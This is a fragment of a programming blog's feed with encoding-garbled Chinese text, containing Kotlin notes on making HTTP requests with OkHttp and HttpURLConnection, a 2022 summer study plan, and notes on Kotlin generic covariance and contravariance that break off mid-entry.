      <link href="/2022/09/03/okhttp-usage/"/>
      <url>/2022/09/03/okhttp-usage/</url>
      
        <content type="html"><![CDATA[<h1 id="OKHttp-HttpURLConnectionä½¿ç”¨ç¬”è®°"><a href="#OKHttp-HttpURLConnectionä½¿ç”¨ç¬”è®°" class="headerlink" title="OKHttp/HttpURLConnectionä½¿ç”¨ç¬”è®°"></a>OKHttp/HttpURLConnectionä½¿ç”¨ç¬”è®°</h1><p>åºŸè¯ä¸å¤šè¯´ï¼Œä¸Šä»£ç </p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// ä½¿ç”¨OKHttpæäº¤æ•°æ®</span><span class="token keyword">private</span> <span class="token keyword">fun</span> <span class="token function">okHttpPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    coroutineScope<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>IO<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> requestBody <span class="token operator">=</span> FormBody<span class="token punctuation">.</span><span class="token function">Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"admin"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token string">"123456"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">val</span> request <span class="token operator">=</span> Request<span class="token punctuation">.</span><span class="token function">Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>requestBody<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">// ä¹‹åæ“ä½œè·Ÿæ‹‰å–æ•°æ®ä¸€æ ·</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// ä½¿ç”¨OKHttpæ‹‰å–æ•°æ®</span><span class="token comment">// æ¯”HttpUrlConnectionå¥½ä½¿å¤šäº†</span><span class="token keyword">private</span> <span class="token keyword">fun</span> <span class="token function">okHttpPull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    coroutineScope<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>IO<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">val</span> client <span class="token operator">=</span> <span class="token function">OkHttpClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">val</span> request <span class="token operator">=</span> Request<span class="token punctuation">.</span><span class="token function">Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">val</span> response <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">val</span> <span class="token keyword">data</span> <span class="token operator">=</span> response<span class="token punctuation">.</span>body<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">withContext</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>Main<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    binding<span class="token punctuation">.</span>responseText<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token keyword">data</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token operator">:</span> Exception<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// ä½¿ç”¨HttpURLConnectionæäº¤æ•°æ®</span><span class="token keyword">private</span> <span class="token keyword">fun</span> <span class="token function">httpUrlConnectionPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> connection<span class="token operator">:</span> HttpURLConnection<span class="token operator">?</span> <span class="token operator">=</span> <span class="token keyword">null</span>    <span class="token comment">// ç½‘ç»œè¯·æ±‚æ“ä½œ æ‹¿åˆ°connection</span>    connection<span class="token operator">!!</span><span class="token punctuation">.</span>requestMethod <span class="token operator">=</span> <span class="token string">"POST"</span>    <span class="token keyword">val</span> output <span class="token operator">=</span> <span class="token function">DataOutputStream</span><span class="token punctuation">(</span>connection<span class="token punctuation">.</span>outputStream<span class="token punctuation">)</span>    output<span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span><span class="token string">"username=admin&amp;password=123456"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// ä½¿ç”¨HttpURLConnectionæ‹‰å–æ•°æ®</span><span class="token keyword">private</span> <span class="token keyword">fun</span> <span class="token function">httpUrlConnectionPull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// å³ä½¿ä½¿ç”¨åç¨‹ï¼Œç½‘ç»œæ“ä½œä¹Ÿä¸èƒ½åœ¨ä¸»çº¿ç¨‹ä¸Šè¿è¡Œï¼Œéœ€è¦ä½¿ç”¨Dispatchers.IO</span>    coroutineScope<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>IO<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> connection<span class="token operator">:</span> HttpURLConnection<span class="token operator">?</span> <span class="token operator">=</span> <span class="token keyword">null</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">val</span> response <span class="token operator">=</span> <span class="token function">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">val</span> url <span class="token operator">=</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span>            connection <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> HttpURLConnection            connection<span class="token punctuation">.</span>connectTimeout <span class="token operator">=</span> <span class="token number">8000</span>            connection<span class="token punctuation">.</span>readTimeout <span class="token operator">=</span> <span class="token number">8000</span>            <span class="token keyword">val</span> input <span class="token operator">=</span> connection<span class="token punctuation">.</span>inputStream            <span class="token keyword">val</span> reader <span class="token operator">=</span> <span class="token function">BufferedReader</span><span class="token punctuation">(</span><span class="token function">InputStreamReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span>            reader<span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span>                reader<span class="token punctuation">.</span><span class="token function">forEachLine</span> <span class="token punctuation">{</span>                    response<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment">// åˆ‡å›ä¸»åç¨‹ï¼Œè¿™æ ·åšæ˜¯å› ä¸ºDispatcher.IOçš„åç¨‹å…¶å®ä¸éš¶å±äºä¸»çº¿ç¨‹</span>            <span class="token function">withContext</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>Main<span class="token punctuation">)</span> <span class="token punctuation">{</span>                binding<span class="token punctuation">.</span>responseText<span class="token punctuation">.</span>text <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token operator">:</span> Exception<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            connection<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">disconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> å¤–éƒ¨åº“ </tag>
            
            <tag> ç½‘ç»œæ“ä½œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022æš‘å‡å­¦ä¹ è®¡åˆ’</title>
      <link href="/2022/09/03/learning-plan-of-summer-vacation/"/>
      <url>/2022/09/03/learning-plan-of-summer-vacation/</url>
      
        <content type="html"><![CDATA[<h1 id="2022æš‘å‡å­¦ä¹ è®¡åˆ’"><a href="#2022æš‘å‡å­¦ä¹ è®¡åˆ’" class="headerlink" title="2022æš‘å‡å­¦ä¹ è®¡åˆ’"></a>2022æš‘å‡å­¦ä¹ è®¡åˆ’</h1><p>ä¼˜å…ˆåº¦æŒ‰ç…§é¡ºåºæ¥</p><ul><li>JVM</li><li>Jetpack Compose</li><li>è‡ªå®šä¹‰View</li><li>React/Vue/Electron</li><li>Flutter</li><li>Go Web / Java NIO / Java Web</li></ul><p>æ²¡å¿…è¦çº ç»“Compose for Desktop / Compose for MultiPlatformï¼Œç›®å‰æˆ‘è®¤ä¸ºæ¡Œé¢åº”ç”¨è¿˜æ˜¯Electronæ¥å¾—å¿«äº›ã€‚Electronæœ‰Webå‰ç«¯çš„ç”Ÿæ€ï¼Œè€ŒComposeç°åœ¨ç”Ÿæ€å±å®ä¸å¤ªè¡Œã€‚å¹¶ä¸”æˆ‘è®¤ä¸ºæˆ‘è¿™æ®µæ—¶é—´å‰ç«¯å†™å¾—ç¡®å®æŒºå°‘ï¼Œè¿«åˆ‡çš„éœ€è¦ç»ƒä¹ ï¼Œå¦‚æœå¼€å‘æ¡Œé¢åº”ç”¨ä¹Ÿä½¿ç”¨å‰ç«¯çš„æŠ€æœ¯çš„è¯ä¹Ÿèƒ½æœ‰æ›´å¤šæœºä¼šç£¨ç»ƒå‰ç«¯æŠ€æœ¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è®¡åˆ’ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ è®¡åˆ’ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kotlin æ³›å‹åå˜/é€†å˜å­¦ä¹ ç¬”è®°</title>
      <link href="/2022/09/03/kotlin-generics-covariation-and-inversion/"/>
      <url>/2022/09/03/kotlin-generics-covariation-and-inversion/</url>
      
        <content type="html"><![CDATA[<h1 id="Kotlin-æ³›å‹åå˜-é€†å˜å­¦ä¹ ç¬”è®°"><a href="#Kotlin-æ³›å‹åå˜-é€†å˜å­¦ä¹ ç¬”è®°" class="headerlink" title="Kotlin æ³›å‹åå˜/é€†å˜å­¦ä¹ ç¬”è®°"></a>Kotlin æ³›å‹åå˜/é€†å˜å­¦ä¹ ç¬”è®°</h1><h2 id="åå˜"><a href="#åå˜" class="headerlink" title="åå˜"></a>åå˜</h2><h3 id="æˆ‘çš„ç†è§£"><a href="#æˆ‘çš„ç†è§£" class="headerlink" title="æˆ‘çš„ç†è§£"></a>æˆ‘çš„ç†è§£</h3><p>è®¾æƒ³ä»¥ä¸‹æƒ…å†µ: Studentæ˜¯Personçš„å­ç±»</p><p>æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªData&lt;T&gt;(val data: T)ä½œä¸ºå®¹å™¨æ¥å­˜æ”¾ä»–ä»¬</p><p>å‡½æ•°testæ¥å—ä¸€ä¸ªç±»å‹ä¸ºData&lt;Person&gt;çš„å‚æ•°,æˆ‘ä»¬æ‰‹ä¸Šæœ‰ä¸€ä¸ªç±»å‹ä¸ºData&lt;Student&gt;çš„å®ä¾‹</p><p>æˆ‘ä»¬ç†æ‰€å½“ç„¶çš„æŠŠå®ƒä½œä¸ºå‚æ•°ä¼ å…¥testå‡½æ•°ï¼Œå´å‘ç°ç¼–è¯‘æ— æ³•é€šè¿‡</p><p>è¿™æ—¶ä½ å‚»çœ¼äº†ï¼ŒåŸæ¥Data&lt;Student&gt;è·Ÿæœ¬æ— æ³•ä½œä¸ºä¸€ä¸ªData&lt;Person&gt;çš„å‚æ•°ä¼ å…¥å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ²¡æ³•éšå¼å‘ä¸‹è½¬å‹</p><p>ä½†æˆ‘ä»¬å‘ç°ï¼Œä½¿ç”¨Listè¿™æ ·çš„å®¹å™¨æ˜¯å…è®¸è¿™æ ·åšçš„</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">open</span> <span class="token keyword">class</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">val</span> name<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token function">Student</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">,</span> <span class="token keyword">val</span> level<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">Person</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">class</span> Data<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> T<span class="token punctuation">)</span><span class="token keyword">fun</span> <span class="token function">test</span><span class="token punctuation">(</span>people<span class="token operator">:</span> List<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">test</span><span class="token punctuation">(</span>people<span class="token operator">:</span> Data<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> studentList <span class="token operator">=</span> <span class="token function">arrayListOf</span><span class="token punctuation">(</span>        <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>    <span class="token keyword">val</span> <span class="token keyword">data</span> <span class="token operator">=</span> <span class="token function">Data</span><span class="token punctuation">(</span><span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span> <span class="token comment">// ç¼–è¯‘ä¸èƒ½é€šè¿‡</span>    <span class="token function">test</span><span class="token punctuation">(</span>studentList<span class="token punctuation">)</span> <span class="token comment">// ç¼–è¯‘å¯ä»¥é€šè¿‡</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ˜¯å› ä¸ºListè¿™ä¸ªç±»å‹ç”¨åˆ°äº†æ³›å‹çš„åå˜ï¼Œè¿™ç±»é—®é¢˜æˆ‘ä»¬åº”è¯¥ä½¿ç”¨æ³›å‹çš„åå˜æ¥å¤„ç†</p><p>å®é™…ä¸ŠJavaä¸ºäº†æœç»å®‰å…¨éšæ‚£ï¼Œæ˜¯ä¸å…è®¸è¿™æ ·ä¼ é€’å‚æ•°çš„ã€‚æ¢å¥è¯è¯´ï¼Œå³ä½¿ Studentæ˜¯Personçš„å­ç±»ï¼ŒSimpleDataå¹¶ä¸æ˜¯SimpleDataçš„å­ ç±»ã€‚</p><p>ä½†ç¨ä½œæ€è€ƒï¼Œåƒcrossinlineé‚£æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªçº¦å®šæ¥é¿å…ç±»å‹è½¬æ¢çš„å®‰å…¨éšæ‚£ã€‚å¦‚æœæˆ‘ä»¬çº¦å®šæ³›å‹Tæ˜¯åªè¯»çš„è¯ï¼ˆä¹Ÿå°±æ˜¯ä¸èƒ½æ”¹å˜)ï¼Œä¹Ÿå°±èƒ½é¿å…ç±»å‹è½¬æ¢çš„å®‰å…¨éšæ‚£ï¼Œä½†é‚£æ ·å°±æ„å‘³ç€æˆ‘ä»¬è¿™ä¸ªç±»çš„å‚æ•°ä¸­ä¸èƒ½å«æœ‰æ³›å‹ã€‚è¿™æ ·æŒæœ‰æ³›å‹çš„ç±»å‹ä¾¿ä¼šæ‹¥æœ‰æ³›å‹ç±»å‹çš„ç»§æ‰¿å…³ç³»ã€‚</p><p>è¿™é‡Œå¼•ç”¨ä¸€ä¸‹ã€Šç¬¬ä¸€è¡Œä»£ç : ç¬¬ä¸‰ç‰ˆã€‹ä¸­å¯¹æ³›å‹åå˜çš„å®šä¹‰</p><blockquote><p>å‡å¦‚å®šä¹‰äº†ä¸€ä¸ªMyClassçš„æ³›å‹ç±»ï¼Œå…¶ä¸­A æ˜¯Bçš„å­ç±»å‹ï¼ŒåŒæ—¶MyClass<a>åˆæ˜¯MyClass<b>çš„å­ç±»å‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç§°MyClassåœ¨Tè¿™ä¸ªæ³›å‹ä¸Šæ˜¯åå˜çš„ã€‚</b></a></p><a><b></b></a></blockquote><a><b></b></a><b><h3 id="å±è¯å¤šï¼å¦‚ä½•ä½¿ç”¨"><a></a><a href="#å±è¯å¤šï¼å¦‚ä½•ä½¿ç”¨" class="headerlink" title="å±è¯å¤šï¼å¦‚ä½•ä½¿ç”¨"></a>å±è¯å¤šï¼å¦‚ä½•ä½¿ç”¨</h3><p>åªéœ€è¦åœ¨å£°æ˜æ³›å‹æ—¶åœ¨å‰é¢åŠ ä¸Šoutä¿®é¥°ç¬¦å³å¯ï¼Œä¹‹åä½ ä¾¿éœ€è¦éµå®ˆåå˜çš„çº¦å®š</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">open</span> <span class="token keyword">class</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">val</span> name<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token function">Student</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">,</span> <span class="token keyword">val</span> level<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">Person</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token comment">// å£°æ˜æ³›å‹æ—¶åœ¨å‰é¢åŠ ä¸ªoutå³å¯è§„å®šè¿™ä¸ªç±»åœ¨è¿™ä¸ªæ³›å‹ä¸Šæ˜¯åå˜çš„</span><span class="token keyword">class</span> Data<span class="token operator">&lt;</span><span class="token keyword">out</span> T<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> T<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// ä¸åˆæ³•ï¼Œå› ä¸ºå¤–éƒ¨å¯ä»¥è®¿é—®å¹¶ä¿®æ”¹è¿™ä¸ªå˜é‡</span>    <span class="token comment">// ç¼–è¯‘ä¸é€šè¿‡</span>    <span class="token keyword">var</span> value<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// åˆæ³•ï¼Œå¤–éƒ¨æ— æ³•è®¿é—®è¿™ä¸ªå˜é‡</span>    <span class="token keyword">private</span> <span class="token keyword">var</span> value2<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// åˆæ³•ï¼Œå› ä¸ºè¿™æ˜¯å¸¸é‡ï¼Œå¸¸é‡å€¼æ— æ³•è¢«ä¿®æ”¹</span>    <span class="token keyword">val</span> value3<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// ä¸åˆæ³•ï¼Œå› ä¸ºåå˜è§„å®šäº†ä¸èƒ½åœ¨æ–¹æ³•å‚æ•°ä¸­ä½¿ç”¨æ³›å‹</span>    <span class="token comment">// ç¼–è¯‘ä¸é€šè¿‡</span>    <span class="token keyword">fun</span> <span class="token function">func</span><span class="token punctuation">(</span>input<span class="token operator">:</span> T<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment">// è¿™æ ·åšæ˜¯åˆæ³•çš„ï¼Œæ–¹æ³•çš„è¿”å›å€¼å¯ä»¥ä½¿ç”¨æ³›å‹</span>    <span class="token keyword">fun</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> T <span class="token punctuation">{</span>        <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">test</span><span class="token punctuation">(</span>people<span class="token operator">:</span> List<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">test</span><span class="token punctuation">(</span>people<span class="token operator">:</span> Data<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> studentList <span class="token operator">=</span> <span class="token function">arrayListOf</span><span class="token punctuation">(</span>        <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>    <span class="token keyword">val</span> <span class="token keyword">data</span> <span class="token operator">=</span> <span class="token function">Data</span><span class="token punctuation">(</span><span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span> <span class="token comment">// ä½¿ç”¨åå˜å ç¼–è¯‘é€šè¿‡</span>    <span class="token function">test</span><span class="token punctuation">(</span>studentList<span class="token punctuation">)</span> <span class="token comment">// ç¼–è¯‘å¯ä»¥é€šè¿‡</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é€†å˜"><a href="#é€†å˜" class="headerlink" title="é€†å˜"></a>é€†å˜</h2><p>åå˜è®©æˆ‘ä»¬å¯ä»¥å°†Data&lt;Student&gt;éšå¼å‘ä¸Šè½¬å‹å˜æˆData&lt;Person&gt;</p><p>é‚£ä¹ˆé€†å˜è‡ªç„¶æ˜¯è®©æˆ‘ä»¬å¯ä»¥å‘ä¸‹è½¬å‹ï¼Œå¹¶ä¸”å®ƒæ˜¯éšå¼çš„</p><p>åªè¦æˆ‘ä»¬çº¦å®šæ³›å‹ä¸ä¼šåœ¨è¿”å›å€¼ä¸­ä½¿ç”¨ï¼Œå°±å¯ä»¥è®©æŒæœ‰æ³›å‹çš„ç±»<strong>éšå¼çš„</strong>å‘ä¸‹è½¬å‹ (éšå¼çš„å‘ä¸Šè½¬å‹æ„å‘³ç€è¿™å¯èƒ½ä¸ä¼šåƒåå˜é‚£æ ·å®‰å…¨)</p><h3 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">open</span> <span class="token keyword">class</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">val</span> name<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token function">Student</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">,</span> <span class="token keyword">val</span> level<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">Person</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">interface</span> Transformer<span class="token operator">&lt;</span><span class="token keyword">in</span> T<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">fun</span> <span class="token function">transform</span><span class="token punctuation">(</span>t<span class="token operator">:</span> T<span class="token punctuation">)</span><span class="token operator">:</span> String<span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> trans <span class="token operator">=</span> <span class="token keyword">object</span> <span class="token operator">:</span> Transformer<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">transform</span><span class="token punctuation">(</span>t<span class="token operator">:</span> Person<span class="token punctuation">)</span><span class="token operator">:</span> String <span class="token punctuation">{</span>            <span class="token keyword">return</span> t<span class="token punctuation">.</span>name        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">handleTransformer</span><span class="token punctuation">(</span>trans<span class="token punctuation">)</span> <span class="token comment">// å¦‚æœä¸å£°æ˜é€†å˜ è¿™è¡Œä»£ç æ— æ³•é€šè¿‡ç¼–è¯‘</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">handleTransformer</span><span class="token punctuation">(</span>trans<span class="token operator">:</span> Transformer<span class="token operator">&lt;</span>Student<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> student <span class="token operator">=</span> <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"Tom"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> result <span class="token operator">=</span> trans<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="UnsafeVarianceæ³¨è§£"><a href="#UnsafeVarianceæ³¨è§£" class="headerlink" 